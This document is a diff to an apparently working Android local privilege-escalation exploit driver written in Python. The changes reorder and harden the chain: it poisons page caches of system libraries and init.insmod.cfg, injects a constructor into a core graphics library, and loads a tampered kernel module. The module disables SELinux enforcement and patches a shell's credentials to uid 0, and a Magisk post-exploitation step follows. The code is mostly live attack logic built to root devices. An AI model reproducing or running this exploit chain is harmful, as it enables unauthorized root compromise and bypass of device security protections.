@@ -450,7 +450,18 @@ def run_merged(tgt, device_override, cleanup, verify_root, settle, skip_magisk):
     if not port: err("stager failed (stale SA? reboot to clear xfrm)"); stager.stop(); sys.exit(1)
     ok(f"SA live, encap port {port}")
 
-    eva_stub_len = 0; orig_las = b""
+    eva_stub_len = 0; orig_las = b""; success = False; _reverted = [False]
+    def do_revert():
+        # Restore the code-injection poisons (core inject lib + libandroid dump). Idempotent and
+        # SA-independent (poison() self-stages its own Writer SA), so it is safe to call early AND
+        # again in finally. Reverting the CORE inject lib ASAP is what keeps a failed run from
+        # crash-looping the device on graphics processes that re-dlopen it.
+        if _reverted[0]: return
+        _reverted[0] = True
+        if eva_stub_len:
+            poison(adb, inj(tgt)["device_path"], inject_restore_spec(tgt, eva_stub_len), "inject_restore")
+        if orig_las:
+            poison(adb, tgt["libandroid_servers"]["device_path"], libas_restore_spec(tgt, orig_las), "libas_restore")
     try:
         # waiting shell FIRST — its pid is baked into the merged carrier's cred-patch
         step("Launching waiting shell (pid baked into carrier, cred-patched to uid 0 at module load)")
@@ -463,11 +474,13 @@ def run_merged(tgt, device_override, cleanup, verify_root, settle, skip_magisk):
         step("Merged carrier (build_credmod: enforcing=0 + status-sync + cred-patch, anchor-relative)")
         credko = os.path.join(BUILD, "carrier_merged.ko")
         cc = os.path.join(tdir, carrier["local_ko"])
-        r = subprocess.run([sys.executable, os.path.join(HERE, "build_credmod.py"), cc, credko,
-                            k["delta_selinux_from_anchor"], k["delta_findvpid_from_anchor"],
-                            k["delta_pidtask_from_anchor"], str(pid), k["delta_ssuse_from_anchor"],
-                            str(k["enforcing_off"]), k.get("cred_off", "0x778")],
-                           capture_output=True, text=True)
+        cm_args = [sys.executable, os.path.join(HERE, "build_credmod.py"), cc, credko,
+                   k["delta_selinux_from_anchor"], k["delta_findvpid_from_anchor"],
+                   k["delta_pidtask_from_anchor"], str(pid), k["delta_ssuse_from_anchor"],
+                   str(k["enforcing_off"]), k.get("cred_off", "0x778")]
+        if k.get("delta_text_from_anchor"):
+            cm_args += [k["delta_text_from_anchor"]]   # pdr lower-bound guard (crash-proofs bad decode)
+        r = subprocess.run(cm_args, capture_output=True, text=True)
         if r.returncode: err("build_credmod failed: " + r.stderr + r.stdout); wsh.stop(); stager.stop(); return
         ok(r.stdout.strip().split(": ", 1)[-1])
         carrier_want = open(credko, "rb").read(); carrier_cur = open(cc, "rb").read()
@@ -476,14 +489,10 @@ def run_merged(tgt, device_override, cleanup, verify_root, settle, skip_magisk):
         ok(f"cfg patched  ({sum(1 for i in range(len(cfg_want)) if cfg_want[i]!=cfg_cur[i])} diff bytes)")
 
         banner("POISON  (shell -> page caches)")
-        # cfg: shell-readable under Enforcing on this target -> poison directly from shell
-        step("init.insmod.cfg  (shell-direct; readable under Enforcing here)")
-        adb.sh(f"cat {cfg['device_path']} >/dev/null 2>&1")   # prime page cache
-        off = hx(cfg["inject_off"]); ln = cfg["inject_len"]
-        cfg_spec = bytearray()
-        for i in range(off, off + ln): cfg_spec += struct.pack("<I", i) + bytes([cfg_want[i]])
-        poison(adb, cfg["device_path"], bytes(cfg_spec), "cfg")
-        # carrier (rdbg, vendor_file): via init_array ctor injected into a trackingservice lib
+        # carrier (rdbg, vendor_file): via init_array ctor injected into a trackingservice lib.
+        # NOTE the inject lib (e.g. libgralloc.qti) is a CORE lib loaded by many graphics procs, so
+        # this poison is reverted the instant the ctor has done its job (see EARLY REVERT below) to
+        # keep the blast radius to a few seconds and off the module-load path.
         step("inject-lib stub  (init_array[0] -> 1-file carrier poison in the gap)")
         eva_raw, eva_spec, cnts = build_inject_stub(tgt, port,
             [(carrier["device_path"], carrier_cur, carrier_want)])
@@ -506,10 +515,26 @@ def run_merged(tgt, device_override, cleanup, verify_root, settle, skip_magisk):
             time.sleep(1); pid1 = adb.sh(f"pidof {tsvc}")
             if pid1 and pid1 != pid0: break
         if pid1 == pid0 or not pid1:
-            err(f"{tsvc} did not restart (pid still {pid0}) — dump stub not hit"); wsh.stop(); return
+            err(f"{tsvc} did not restart (pid still {pid0}) — dump stub not hit"); return
         ok(f"{tsvc} restarted  pid {pid0} -> {pid1}")
         info(f"settling {settle}s for the ctor's carrier poison to complete")
         time.sleep(settle)
+
+        # EARLY REVERT: the ctor has now poisoned rdbg's page cache; the core inject lib is no longer
+        # needed, so restore it (and libandroid) BEFORE the module load. This removes the crash-prone
+        # core-lib poison from the rest of the run.
+        step("Reverting inject-lib + libandroid poison (ctor done; before module load)")
+        do_revert()
+
+        # cfg: shell-readable under Enforcing on this target -> poison directly from shell, LATE
+        # (right before the trigger) so the single 227B cfg page isn't evicted during the settle.
+        step("init.insmod.cfg  (shell-direct; readable under Enforcing here)")
+        adb.sh(f"cat {cfg['device_path']} >/dev/null 2>&1")   # prime page cache
+        off = hx(cfg["inject_off"]); ln = cfg["inject_len"]
+        cfg_spec = bytearray()
+        for i in range(off, off + ln): cfg_spec += struct.pack("<I", i) + bytes([cfg_want[i]])
+        poison(adb, cfg["device_path"], bytes(cfg_spec), "cfg")
+
         step(f"setprop ctl.start {isvc}  ->  init finit_modules the poisoned carrier")
         adb.sh(f"setprop ctl.start {isvc}")
 
@@ -522,21 +547,25 @@ def run_merged(tgt, device_override, cleanup, verify_root, settle, skip_magisk):
         after = adb.sh("getenforce")
         if after == "Permissive":
             win(f"SELinux {before} -> {after}   (from uid={adb.sh('id -u')} shell, zero root)")
+            if rooted:
+                win(f"waiting shell {wsh.pid} cred-patched -> uid 0"); success = True
+            else:
+                err(f"permissive but shell not cred-patched — {uline or 'no Uid line'}")
         else:
-            err(f"getenforce={after} (expected Permissive) — carrier load failed"); wsh.stop(); return
-        if not rooted:
-            err(f"waiting shell not cred-patched — {uline or 'no Uid line'} (carrier loaded but cred-patch missed?)"); wsh.stop(); return
-        win(f"waiting shell {wsh.pid} cred-patched -> uid 0")
+            err(f"getenforce={after} (expected Permissive) — carrier load failed / did not run")
     except Exception:
-        stager.stop(); raise
+        raise
     finally:
+        do_revert()                 # safety net: guarantee the core inject lib is clean on every path
         stager.stop(); ok("stager stopped (SA reaped)")
 
-    # revert the code-injection poisons (inject lib ctor + libandroid dump) now that we're permissive
-    step("Reverting code-injection poisons (inject-lib ctor + libandroid dump) via shell")
-    poison(adb, inj(tgt)["device_path"], inject_restore_spec(tgt, eva_stub_len), "inject_restore")
-    if orig_las:
-        poison(adb, tgt["libandroid_servers"]["device_path"], libas_restore_spec(tgt, orig_las), "libas_restore")
+    if not success:
+        wsh.stop()
+        err("merged chain did NOT complete — inject/libandroid poisons reverted.")
+        warn("if the DEVICE crashed/rebooted after this, grab the panic log once it is back:")
+        warn("  su -c 'cat /sys/fs/pstore/console-ramoops-0 /sys/fs/pstore/dmesg-ramoops-0 /proc/last_kmsg 2>/dev/null'")
+        warn("  su -c 'lsmod | grep rdbg; dmesg | grep -iE \"rdbg|module|sig|avc\" | tail -40'")
+        return
 
     if cleanup == "postex":
         banner("POST-EX  (root shell -> Magisk)")
